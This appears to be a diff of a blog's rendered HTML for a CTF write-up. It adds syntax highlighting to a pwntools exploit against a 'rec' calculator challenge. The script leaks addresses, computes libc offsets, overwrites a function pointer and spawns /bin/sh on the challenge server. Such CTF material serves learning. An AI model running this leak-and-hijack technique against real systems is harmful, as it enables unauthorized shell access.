@@ -367,93 +367,92 @@ Calculators are fun!
   <li>Goto <code class="highlighter-rouge">sign</code> function and input <code class="highlighter-rouge">0</code>, call <code class="highlighter-rouge">system("/bin/sh")</code> and get the shell</li>
 </ol>
 
-<p>Here’s the exploit. The libc’s information are provided by <a href="https://github.com/niklasb/libc-database">libc-database</a>
-```python exp_rec.py
-#!/usr/bin/env python</p>
+<p>Here’s the exploit. The libc’s information are provided by <a href="https://github.com/niklasb/libc-database">libc-database</a></p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python</span>
 
-<p>from pwn import *
-import subprocess
-import sys
-import time
-import numpy</p>
+<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">numpy</span>
 
-<p>HOST = “78.46.224.74”
-PORT = 4127
-ELF_PATH = “./rec”
-LIBC_PATH = “”</p>
+<span class="n">HOST</span> <span class="o">=</span> <span class="s">"78.46.224.74"</span>
+<span class="n">PORT</span> <span class="o">=</span> <span class="mi">4127</span>
+<span class="n">ELF_PATH</span> <span class="o">=</span> <span class="s">"./rec"</span>
+<span class="n">LIBC_PATH</span> <span class="o">=</span> <span class="s">""</span>
 
-<h1 id="setting">setting</h1>
-<p>context.arch = ‘i386’
-context.os = ‘linux’
-context.endian = ‘little’
-context.word_size = 32</p>
-<h1 id="critical-debug-error-info-notset-warn-warning">[‘CRITICAL’, ‘DEBUG’, ‘ERROR’, ‘INFO’, ‘NOTSET’, ‘WARN’, ‘WARNING’]</h1>
-<p>context.log_level = ‘INFO’</p>
+<span class="c"># setting </span>
+<span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s">'i386'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">os</span> <span class="o">=</span> <span class="s">'linux'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">endian</span> <span class="o">=</span> <span class="s">'little'</span>
+<span class="n">context</span><span class="o">.</span><span class="n">word_size</span> <span class="o">=</span> <span class="mi">32</span>
+<span class="c"># ['CRITICAL', 'DEBUG', 'ERROR', 'INFO', 'NOTSET', 'WARN', 'WARNING']</span>
+<span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s">'INFO'</span>
 
-<p>elf = ELF(ELF_PATH)</p>
+<span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">ELF_PATH</span><span class="p">)</span>
 
-<p>def take_note(note):
-    r.sendlineafter(“&gt; “, “0”)
-    r.sendlineafter(“note: “, note)</p>
+<span class="k">def</span> <span class="nf">take_note</span><span class="p">(</span><span class="n">note</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="s">"0"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"note: "</span><span class="p">,</span> <span class="n">note</span><span class="p">)</span>
 
-<p>def read_note():
-    r.sendlineafter(“&gt; “, “1”)</p>
+<span class="k">def</span> <span class="nf">read_note</span><span class="p">():</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="s">"1"</span><span class="p">)</span>
 
-<p>def polish_sum(nums):
-    r.sendlineafter(“&gt; “, “2”)
-    r.sendlineafter(“Operator:”, “S”)
-    for num in nums:
-        print “adding:”, num
-        r.sendlineafter(“Operand:”, str(num))</p>
+<span class="k">def</span> <span class="nf">polish_sum</span><span class="p">(</span><span class="n">nums</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="s">"2"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Operator:"</span><span class="p">,</span> <span class="s">"S"</span><span class="p">)</span>
+    <span class="k">for</span> <span class="n">num</span> <span class="ow">in</span> <span class="n">nums</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s">"adding:"</span><span class="p">,</span> <span class="n">num</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Operand:"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r.sendlineafter("Operand:", ".")
-</code></pre></div></div>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Operand:"</span><span class="p">,</span> <span class="s">"."</span><span class="p">)</span>
 
-<p>def sign(num):
-    r.sendlineafter(“&gt; “, “5”)
-    r.sendline(str(num))</p>
+<span class="k">def</span> <span class="nf">sign</span><span class="p">(</span><span class="n">num</span><span class="p">):</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"&gt; "</span><span class="p">,</span> <span class="s">"5"</span><span class="p">)</span>
+    <span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">num</span><span class="p">))</span>
 
-<p>if <strong>name</strong> == “<strong>main</strong>”:</p>
 
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>r = remote(HOST, PORT)
-#r = process(ELF_PATH)
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
 
-take_note("123")
-read_note()
+    <span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="n">HOST</span><span class="p">,</span> <span class="n">PORT</span><span class="p">)</span>
+    <span class="c">#r = process(ELF_PATH)</span>
+    
+    <span class="n">take_note</span><span class="p">(</span><span class="s">"123"</span><span class="p">)</span>
+    <span class="n">read_note</span><span class="p">()</span>
 
-r.recvuntil("note: ")
-fptr_addr = u32(r.recv(4)) - 0x350 # where the function pointer be loaded
-text_base = u32(r.recv(4)) - 0x6fb
-puts = text_base + 0x520
-lsm_got = text_base + 0x2fe0
-puts_got = text_base + 0x2fd8
+    <span class="n">r</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"note: "</span><span class="p">)</span>
+    <span class="n">fptr_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x350</span> <span class="c"># where the function pointer be loaded</span>
+    <span class="n">text_base</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span> <span class="o">-</span> <span class="mh">0x6fb</span>
+    <span class="n">puts</span> <span class="o">=</span> <span class="n">text_base</span> <span class="o">+</span> <span class="mh">0x520</span>
+    <span class="n">lsm_got</span> <span class="o">=</span> <span class="n">text_base</span> <span class="o">+</span> <span class="mh">0x2fe0</span>
+    <span class="n">puts_got</span> <span class="o">=</span> <span class="n">text_base</span> <span class="o">+</span> <span class="mh">0x2fd8</span>
+    
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"fptr_addr: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">fptr_addr</span><span class="p">))</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"text_base: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">text_base</span><span class="p">))</span>
 
-log.success("fptr_addr: "+hex(fptr_addr))
-log.success("text_base: "+hex(text_base))
+    <span class="n">nums</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mh">0x63</span><span class="p">)]</span> <span class="o">+</span> <span class="p">[</span><span class="n">puts</span><span class="p">,</span> <span class="n">lsm_got</span><span class="p">]</span>
+    <span class="n">polish_sum</span><span class="p">(</span><span class="n">nums</span><span class="p">)</span>
 
-nums = [i for i in xrange(0x63)] + [puts, lsm_got]
-polish_sum(nums)
+    <span class="n">sign</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c"># this will call puts(lsm_got)</span>
+    <span class="n">lsm_addr</span> <span class="o">=</span> <span class="n">u32</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">4</span><span class="p">))</span>
+    <span class="c">#########################################</span>
+    <span class="c">#$ ./dump libc6-i386_2.24-3ubuntu2_amd64</span>
+    <span class="c">#offset___libc_start_main = 0x00018180</span>
+    <span class="c">#offset_system = 0x0003a8b0</span>
+    <span class="c">#offset_str_bin_sh = 0x15cbcf</span>
+    <span class="c">#########################################</span>
+    <span class="n">system_addr</span> <span class="o">=</span> <span class="n">lsm_addr</span> <span class="o">+</span> <span class="mh">0x22730</span> 
+    <span class="n">bin_sh</span> <span class="o">=</span> <span class="n">lsm_addr</span> <span class="o">+</span> <span class="mh">0x144a4f</span> 
+	
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"lsm: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">lsm_addr</span><span class="p">))</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"system: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">system_addr</span><span class="p">))</span>
+    <span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s">"bin_sh: "</span><span class="o">+</span><span class="nb">hex</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">))</span>
 
-sign(0) # this will call puts(lsm_got)
-lsm_addr = u32(r.recv(4))
-#########################################
-#$ ./dump libc6-i386_2.24-3ubuntu2_amd64
-#offset___libc_start_main = 0x00018180
-#offset_system = 0x0003a8b0
-#offset_str_bin_sh = 0x15cbcf
-#########################################
-system_addr = lsm_addr + 0x22730 
-bin_sh = lsm_addr + 0x144a4f 
-
-log.success("lsm: "+hex(lsm_addr))
-log.success("system: "+hex(system_addr))
-log.success("bin_sh: "+hex(bin_sh))
-
-nums = [i for i in xrange(0x63)] + [numpy.int32(system_addr), numpy.int32(bin_sh)]
-polish_sum(nums)
-sign(0) # this time will call system("/bin/sh")
-
-r.interactive() ```
+    <span class="n">nums</span> <span class="o">=</span> <span class="p">[</span><span class="n">i</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mh">0x63</span><span class="p">)]</span> <span class="o">+</span> <span class="p">[</span><span class="n">numpy</span><span class="o">.</span><span class="n">int32</span><span class="p">(</span><span class="n">system_addr</span><span class="p">),</span> <span class="n">numpy</span><span class="o">.</span><span class="n">int32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)]</span>
+    <span class="n">polish_sum</span><span class="p">(</span><span class="n">nums</span><span class="p">)</span>
+    <span class="n">sign</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c"># this time will call system("/bin/sh")</span>
+    
+    <span class="n">r</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
 </code></pre></div></div>
 
 <p>The flag is in <code class="highlighter-rouge">/challenge/flag.txt</code></p>
